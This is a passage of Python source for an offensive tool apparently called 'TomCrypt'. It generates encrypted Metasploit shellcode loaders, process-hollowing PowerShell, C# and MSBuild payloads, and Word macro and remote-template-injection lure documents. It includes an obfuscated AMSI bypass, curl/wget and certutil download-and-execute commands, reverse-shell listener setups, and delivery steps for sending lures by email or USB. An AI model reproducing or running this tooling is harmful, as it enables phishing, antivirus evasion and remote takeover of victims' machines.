        print(info(f"Payload  : downloads http://{lhost}/{exe_name} and runs it"))
        print(info( "Note     : place the exe next to the .txt when serving"))
    else:  # ps1
        print(info(f"Payload  : {cfg.payload}"))
        print(info(f"Arch     : {arch}"))
        shellcode = run_msfvenom(cfg, arch)
        result = encrypt_aes256(shellcode)
        txt_content = (build_ps1_hollow_x64(result, cfg) if arch == "x64"
                       else build_ps1_simple_x86(result, cfg))
        print(info("Note     : full TomCrypt PS1 runner (may be flagged)"))

    if getattr(args, "amsi", False):
        amsi_bypass = '''class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(
  @([System.Runtime.InteropServices.Marshal]::ReadIntPtr(
    [long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8
  )),
  0,
  [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq 'ScanContent').MethodHandle.Value + [long]8,
  1
)
'''
        txt_content = amsi_bypass + "\n" + txt_content
        print(info("AMSI     : TrollAMSI bypass prepended"))

    txt_path.write_text(txt_content, encoding="utf-8")
    print(ok(f"TXT      : {txt_path}"))

    vba_code = build_vba_mini(lhost, txt_path.name)
    vba_path = bdir / f"{stem}.vba"
    vba_path.write_text(vba_code, encoding="utf-8")
    print(ok(f"VBA      : {vba_path}"))

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Serve the .txt:"))
    print(hint(f"  python3 -m http.server 80   (in {bdir})"))
    print()
    print(info("Step 2 - Paste VBA into Word (Alt+F11 -> Insert -> Module):"))
    print(hint(f"  {vba_path}"))
    print(hint( "  Save as .docm or .dotm"))
    print()
    if mode == "rev":
        print(info("Step 3 - Listener:"))
        print(hint(f"  nc -lvnp {args.lport}"))
    elif mode == "exe":
        print(info("Step 3 - Place the exe in the web root, then start handler if needed"))
    else:
        print(info("Step 3 - Handler:"))
        print(hint(f"  msfconsole -q -x 'use multi/handler; set payload {cfg.payload}; "
                   f"set LHOST {lhost}; set LPORT {args.lport}; set ExitOnSession false; run -j'"))
    print(_SEP)


def cmd_vba_cradle(args: argparse.Namespace) -> None:
    lhost = resolve_lhost(args.lhost)
    fmt   = args.format

    cfg = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))

    if arch == "x86":
        print(warn("x86 payload - hollow not supported, self-injection loader will be generated."))

    print(ok(f"TomCrypt v{__version__} [vba shell]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))
    print(info(f"Format   : {fmt}"))
    print(info("Encrypt  : AES-256-CBC"))

    shellcode = run_msfvenom(cfg, arch)
    print(info(f"Shellcode: {len(shellcode):,} B"))
    result = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B ciphertext"))

    default_stem = "HollowLoader" if arch == "x64" else "SimpleLoader"
    stem  = cfg.output.stem if cfg.output else default_stem
    bdir  = cfg.output.parent if cfg.output else Path.cwd()

    if fmt == "exe":
        cs_code  = (build_cs_hollow_x64(result, cfg) if arch == "x64"
                    else build_cs_simple_x86(result, cfg))
        cs_path  = bdir / f"{stem}.cs"
        cs_path.write_text(cs_code, encoding="utf-8")
        print(ok(f"Source   : {cs_path}"))
        payload_file = compile_cs(cs_path, arch)
    else:
        ps_code  = (build_ps1_hollow_x64(result, cfg) if arch == "x64"
                    else build_ps1_simple_x86(result, cfg))
        payload_file = bdir / f"{stem}.{fmt}"
        payload_file.write_text(ps_code, encoding="utf-8")
        print(ok(f"Payload  : {payload_file}"))

    vba_code = build_vba_shell(lhost, args.lport, fmt, payload_file.name)
    vba_path = bdir / f"{stem}_delivery.vba"
    vba_path.write_text(vba_code, encoding="utf-8")
    print(ok(f"VBA macro: {vba_path}"))

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {args.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Serve the payload:"))
    print(hint(f"  python3 -m http.server 80   (in {bdir})"))
    print()
    print(info("Step 2 - Paste VBA into Word (Alt+F11 -> Module -> paste):"))
    print(hint(f"  {vba_path}"))
    print()
    print(ok("Listener :"))
    print(f"  {listener}")
    if arch == "x86" and fmt == "exe":
        print(hint("  x86 exe: Assembly.Load needs 32-bit PS — use %SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"))
    print(_SEP)


def cmd_vba_rti(args: argparse.Namespace) -> None:
    """vba rti - Remote Template Injection, manual .dotm.

    Outputs:
      STEM.bas           VBA to paste into a standard module
      STEM_lure.docx     macro-free document with an attachedTemplate URL
      STEM_serve.py      HTTP server that answers Word's OPTIONS probe
    LibreOffice is not used. It writes StarBasic, not a Word vbaProject.bin.
    """
    lhost      = resolve_lhost(args.lhost)
    serve_port = args.serve_port
    use_ping   = getattr(args, "ping", False)
    use_enum   = getattr(args, "enum", False)
    use_cradle = getattr(args, "cradle", False)
    recv_port  = getattr(args, "recv_port", 8080)
    token      = getattr(args, "token", None) or rand_junk(12)
    fmt        = getattr(args, "format", "exe")

    modes = sum([use_ping, use_enum, use_cradle])
    if modes > 1:
        raise TomCryptError("--ping, --enum, and --cradle are mutually exclusive.")

    if use_ping or use_enum:
        if recv_port == serve_port:
            raise TomCryptError(
                f"--recv-port ({recv_port}) cannot be the same as --serve-port. "
                "The RTI server and the callback listener need different ports."
            )

    if use_ping:
        print(ok(f"TomCrypt v{__version__} [vba rti ping]"))
        print(info(f"LHOST      : {lhost}"))
        print(info(f"RTI server : port {serve_port}"))
        print(info(f"Ping recv  : port {recv_port}"))
        print(info(f"Token      : {token}"))
        print(info("Mode       : Remote Template Injection, minimal ping"))
        vba_code = build_vba_ping(lhost, recv_port, token)
        arch     = "n/a"
    elif use_enum:
        print(ok(f"TomCrypt v{__version__} [vba rti enum]"))
        print(info(f"LHOST      : {lhost}"))
        print(info(f"RTI server : port {serve_port}"))
        print(info(f"Enum recv  : port {recv_port}"))
        print(info("Mode       : Remote Template Injection, quiet recon"))
        vba_code = build_vba_enum_quiet(lhost, recv_port)
        arch     = "n/a"
    elif use_cradle:
        payload, arch = _resolve_rti_payload(args.payload, args.arch)
        cfg = Config(
            payload = payload,
            lhost   = lhost,
            lport   = args.lport,
            target  = r"C:\Windows\System32\svchost.exe",
            output  = Path(args.output) if args.output else None,
        )
        print(ok(f"TomCrypt v{__version__} [vba rti cradle]"))
        print(info(f"Payload   : {cfg.payload}"))
        print(info(f"Arch      : {arch}  (Office bitness, not OS)"))
        print(info(f"LHOST     : {lhost}"))
        print(info(f"LPORT     : {args.lport}"))
        print(info(f"Format    : {fmt}"))
        print(info("Mode      : Remote Template Injection, download-and-execute cradle"))

        shellcode = run_msfvenom(cfg, arch)
        print(info(f"Shellcode : {len(shellcode):,} B"))
        result = encrypt_aes256(shellcode)

        # We'll write the payload file after we know basedir
        vba_code = None  # filled in after payload file is written
    else:
        key        = rand_junk(10)
        payload, arch = _resolve_rti_payload(args.payload, args.arch)

        cfg = Config(
            payload = payload,
            lhost   = lhost,
            lport   = args.lport,
            output  = Path(args.output) if args.output else None,
        )

        print(ok(f"TomCrypt v{__version__} [vba rti]"))
        print(info(f"Payload   : {cfg.payload}"))
        print(info(f"Arch      : {arch}  (Office bitness, not OS)"))
        print(info(f"LHOST     : {lhost}"))
        print(info(f"LPORT     : {args.lport}"))
        print(info(f"XOR key   : {key}"))
        print(info("Mode      : Remote Template Injection, manual .dotm"))

        sc_bytes = _run_msfvenom_vba(cfg, key, arch)
        print(info(f"Shellcode : {len(sc_bytes)} bytes (XOR encrypted)"))
        vba_code = build_vba_runner(sc_bytes, cfg, key)

    stem    = Path(args.output).stem if args.output else "payload"
    basedir = Path(args.output).parent if args.output else Path.cwd()
    basedir.mkdir(parents=True, exist_ok=True)

    if use_cradle:
        # Write the payload file the cradle will download
        default_stem = "HollowLoader" if arch == "x64" else "SimpleLoader"
        payload_stem = stem if args.output else default_stem
        if fmt == "exe":
            cs_code = (build_cs_hollow_x64(result, cfg) if arch == "x64"
                       else build_cs_simple_x86(result, cfg))
            cs_path = basedir / f"{payload_stem}.cs"
            cs_path.write_text(cs_code, encoding="utf-8")
            print(ok(f"Source    : {cs_path}"))
            payload_file = compile_cs(cs_path, arch)
        else:
            ps_code = (build_ps1_hollow_x64(result, cfg) if arch == "x64"
                       else build_ps1_simple_x86(result, cfg))
            payload_file = basedir / f"{payload_stem}.{fmt}"
            payload_file.write_text(ps_code, encoding="utf-8")
            print(ok(f"Payload   : {payload_file}"))
        vba_code = build_vba_shell(lhost, args.lport, fmt, payload_file.name)
        print(ok(f"Cradle will download: http://{lhost}/{payload_file.name}"))

    dotm_name = f"{stem}.dotm"
    bas_path  = basedir / f"{stem}.bas"
    docx_path = basedir / f"{stem}_lure.docx"
    srv_path  = basedir / f"{stem}_serve.py"

    if use_ping:
        banner = (
            f"' ===== TomCrypt RTI PING =====\n"
            f"' Save the Word template as exactly: {dotm_name}\n"
            "' Paste into Alt+F11 -> Insert -> Module (standard module).\n"
            "' AutoOpen runs when Word loads this template.\n"
            f"' Token: {token}\n"
            "' =====================================\n"
        )
    elif use_enum:
        banner = (
            f"' ===== TomCrypt RTI ENUM =====\n"
            f"' Save the Word template as exactly: {dotm_name}\n"
            "' Paste into Alt+F11 -> Insert -> Module (standard module).\n"
            "' AutoOpen runs when Word loads this template.\n"
            "' Sends Office bitness and DOMAIN\\user (quiet, no WMI).\n"
            "' =====================================\n"
        )
    elif use_cradle:
        banner = (
            f"' ===== TomCrypt RTI CRADLE ({arch}) =====\n"
            f"' Save the Word template as exactly: {dotm_name}\n"
            "' Paste into Alt+F11 -> Insert -> Module (standard module).\n"
            "' AutoOpen runs when Word loads this template.\n"
            f"' Downloads and executes the {fmt} payload.\n"
            "' =====================================\n"
        )
    else:
        banner = (
            f"' ===== TomCrypt RTI {arch} =====\n"
            f"' Save the Word template as exactly: {dotm_name}\n"
            "' Paste into Alt+F11 -> Insert -> Module (standard module).\n"
            "' AutoOpen runs when Word loads this template.\n"
            "' Document_Open only fires from ThisDocument, not from a standard module.\n"
            "' =====================================\n"
        )
    bas_path.write_text(banner + vba_code, encoding="utf-8")
    print(ok(f"VBA src   : {bas_path}"))

    docx_path.write_bytes(build_docx_rti(lhost, serve_port, dotm_name))
    print(ok(f"Lure doc  : {docx_path}  ({docx_path.stat().st_size:,} B)"))

    srv_path.write_text(build_rti_server(serve_port), encoding="utf-8")
    srv_path.chmod(0o755)
    print(ok(f"Server    : {srv_path}"))

    tgt_url = rti_template_url(lhost, serve_port, dotm_name)
    sudo = "sudo " if serve_port < 1024 else ""

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info(f"Step 0 - Build {dotm_name} by hand (required)"))
    print(hint( "  On Windows: open Word, Alt+F11, Insert -> Module, paste the .bas."))
    print(hint( "  File -> Save As -> Word Macro-Enabled Template (*.dotm)."))
    print(hint(f"  Name it exactly {dotm_name} (case-sensitive) and copy it next to the serve script."))
    if not (use_ping or use_enum):
        print(hint(f"  Arch is {arch} — must match Office bitness (File -> Account -> About Word)."))
    print()
    if use_ping:
        print(info("Step 1 - Kali: start receiver"))
        print(hint(f"  nc -lvnp {recv_port}"))
        print(hint(f"  Look for: ping={token}"))
    elif use_enum:
        print(info("Step 1 - Kali: start receiver"))
        print(hint(f"  nc -lvnp {recv_port}"))
        print(hint( "  Look for: arch=...&user=..."))
    else:
        print(info("Step 1 - Kali: start Metasploit handler"))
        print(hint(f"  msfconsole -q -x 'use multi/handler; set payload {cfg.payload}; "
                   f"set LHOST {lhost}; set LPORT {args.lport}; set ExitOnSession false; run -j'"))
        if use_cradle:
            print(hint(f"  The RTI server also serves the payload file ({payload_file.name})."))
            print(hint( "  No second HTTP server is required."))
            if arch == "x86" and fmt == "exe":
                print(hint("  x86 exe: Assembly.Load needs 32-bit PowerShell on the target"))
    print()
    print(info("Step 2 - Kali: run the RTI server"))
    print(hint(f"  {sudo}python3 {srv_path}"))
    print(hint( "  (serves the .dotm; for --cradle it also serves the payload file)"))
    print()
    print(info("Step 3 - Deliver the lure (the .docx, not the .dotm)"))
    print(hint(f"  Send {docx_path.name} by email / share / USB."))
    print(hint(f"  On open, Word fetches {tgt_url}"))
    if use_ping:
        print(hint(f"  You should receive: ping={token}"))
    elif use_enum:
        print(hint( "  You should receive Office bitness and DOMAIN\\user."))
    print()
    print(info("If this URL already failed once, Word cached the failure:"))
    print(hint( "  taskkill /F /IM WINWORD.EXE"))
    print(hint(r"  del /q %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.Word\*"))
    print(hint(r"  del /q %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.MSO\*"))
    print(hint( "  Or regenerate with a new -o stem so the template name changes."))
    print(_SEP)


def cmd_ligolo(args: argparse.Namespace) -> None:
    """donut -> AES-256-CBC -> MSBuild XML.  One Kali command, one target command."""
    lhost = resolve_lhost(args.lhost)
    agent = Path(args.agent)

    if not agent.exists():
        raise TomCryptError(
            f"Agent binary not found: {agent}\n"
            "  Place agent.exe in cwd or pass -i /path/to/agent.exe"
        )

    cfg = Config(
        payload = "ligolo-ng/agent",
        lhost   = lhost,
        lport   = args.lport,
        target  = args.target,
        output  = Path(args.output) if args.output else None,
    )

    print(ok(f"TomCrypt v{__version__} [ligolo]"))
    print(info(f"Agent    : {agent}  ({agent.stat().st_size:,} B)"))
    print(info(f"LHOST    : {lhost}"))
    print(info(f"LPORT    : {args.lport}"))
    print(info(f"Target   : {cfg.target}"))
    print(info("Format   : xml  (MSBuild CLM bypass)"))
    print(info("Encrypt  : AES-256-CBC"))

    shellcode = run_donut(agent, lhost, args.lport)
    result    = encrypt_aes256(shellcode)
    print(info(f"Encrypted: {result.original_len:,} B -> {len(result.ciphertext):,} B"))

    stem    = cfg.output.stem   if cfg.output else "ligolo"
    basedir = cfg.output.parent if cfg.output else Path.cwd()

    xml_code = build_xml_hollow_x64(result, cfg)
    xml_path = basedir / f"{stem}.xml"
    xml_path.write_text(xml_code, encoding="utf-8")
    print(ok(f"XML      : {xml_path}"))

    msb     = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
    tgt_xml = f"C:\\Users\\Public\\{xml_path.name}"
    url     = f"http://{lhost}/{xml_path.name}"

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Kali: start ligolo-proxy"))
    print(hint( "  sudo ligolo-proxy -ignore-cert"))
    print()
    print(info("Step 2 - Kali: serve the XML"))
    print(hint(f"  python3 -m http.server 80   (in {basedir})"))
    print()
    print(info("Step 3 - Target: transfer XML (pick one)"))
    print(hint(f"  curl      : curl -s -o {tgt_xml} {url}"))
    print(hint(f"  certutil  : certutil -urlcache -f {url} {tgt_xml}"))
    print(hint(f"  meterp    : upload {xml_path} {tgt_xml}"))
    print()
    print(info("Step 4 - Target: execute via MSBuild"))
    print(hint(f"  {msb} {tgt_xml}"))
    print()
    print(info("Step 5 - Kali: once agent connects"))
    print(hint( "  session"))
    print(hint( "  interact 1"))
    print(hint( "  start"))
    print(hint( "  autoroute"))
    print(_SEP)



def cmd_linux(args) -> None:
    """linux subcommand — thin wrapper around msfvenom -f elf.

    Produces a ready-to-run ELF binary. No custom loaders, no OpenSSL,
    no cryptography dependency, and no extra libraries required on the target.
    """
    lhost = resolve_lhost(args.lhost)
    cfg = Config(
        payload = args.payload,
        lhost   = lhost,
        lport   = args.lport,
        output  = Path(args.output) if args.output else None,
    )

    arch = resolve_arch(cfg.payload, getattr(args, "arch", None))

    if cfg.output:
        out_path = cfg.output
    else:
        out_path = Path.cwd() / "loader"
    basedir = out_path.parent
    basedir.mkdir(parents=True, exist_ok=True)

    print(ok(f"TomCrypt v{__version__} [linux]"))
    print(info(f"Payload  : {cfg.payload}"))
    print(info(f"Arch     : {arch}"))
    print(info(f"LHOST    : {cfg.lhost}"))
    print(info(f"LPORT    : {cfg.lport}"))
    print(info("Format   : elf  (msfvenom -f elf)"))

    cmd = [
        "msfvenom", "-p", cfg.payload, "-a", arch,
        f"LHOST={cfg.lhost}", f"LPORT={cfg.lport}",
        "-f", "elf", "-o", str(out_path),
    ]
    print(info(f"msfvenom: {' '.join(cmd)}"))
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except FileNotFoundError:
        raise TomCryptError("msfvenom not found.")
    except subprocess.TimeoutExpired:
        raise TomCryptError("msfvenom timed out after 120 s.")
    if p.returncode != 0:
        raise TomCryptError(f"msfvenom failed:\n{p.stderr or p.stdout}")
    if not out_path.exists() or out_path.stat().st_size == 0:
        raise TomCryptError("msfvenom produced empty or missing ELF.")

    out_path.chmod(0o755)
    print(ok(f"ELF      : {out_path}  ({out_path.stat().st_size:,} B)"))

    listener = (
        f"msfconsole -q -x 'use multi/handler; "
        f"set payload {cfg.payload}; "
        f"set LHOST {cfg.lhost}; "
        f"set LPORT {cfg.lport}; "
        f"set ExitOnSession false; run -j'"
    )

    print()
    print(_SEP)
    print(ok("DELIVERY"))
    print(_SEP)
    print(info("Step 1 - Kali: serve the ELF"))
    print(hint(f"  python3 -m http.server 80   (in {basedir})"))
    print()
    print(info("Step 2 - Target (Linux): fetch, chmod, execute"))
    print(hint(
        f"  curl -s -o /tmp/{out_path.name} http://{lhost}/{out_path.name} "
        f"&& chmod +x /tmp/{out_path.name} && /tmp/{out_path.name}"
    ))
    print(hint(
        f"  # or: wget -q -O /tmp/{out_path.name} http://{lhost}/{out_path.name} "
        f"&& chmod +x /tmp/{out_path.name} && /tmp/{out_path.name}"
    ))
    print()
    print(ok("Listener :"))
    print(f"  {listener}")
    print(_SEP)


def main() -> None:
    parser = build_parser()
    args   = parser.parse_args()
    try:
        if args.command == "hollow":
            cmd_hollow(args)
        elif args.command == "msbuild":
            cmd_msbuild(args)
        elif args.command == "hta":
            if args.hta_command == "enum":
                cmd_hta_enum(args)
            elif args.hta_command == "ping":
                cmd_hta_ping(args)
            elif args.hta_command == "msbuild":
                cmd_hta_msbuild(args)
            elif args.hta_command == "installutil":
                cmd_hta_cradle(args)
        elif args.command == "ligolo":
            cmd_ligolo(args)
        elif args.command == "linux":
            cmd_linux(args)
        elif args.command == "vba":
            if args.vba_command == "enum":
                cmd_vba_enum(args)
            elif args.vba_command == "ping":
                cmd_vba_ping(args)
            elif args.vba_command == "mini":
                cmd_vba_mini(args)
            elif args.vba_command == "runner":
                cmd_vba_runner(args)
            elif args.vba_command == "cradle":
                cmd_vba_cradle(args)
            elif args.vba_command == "rti":
                cmd_vba_rti(args)
    except TomCryptError as e:
        print(err(str(e)))
        sys.exit(1)
    except KeyboardInterrupt:
        print(warn("Interrupted."))
        sys.exit(130)


if __name__ == "__main__":
    main()
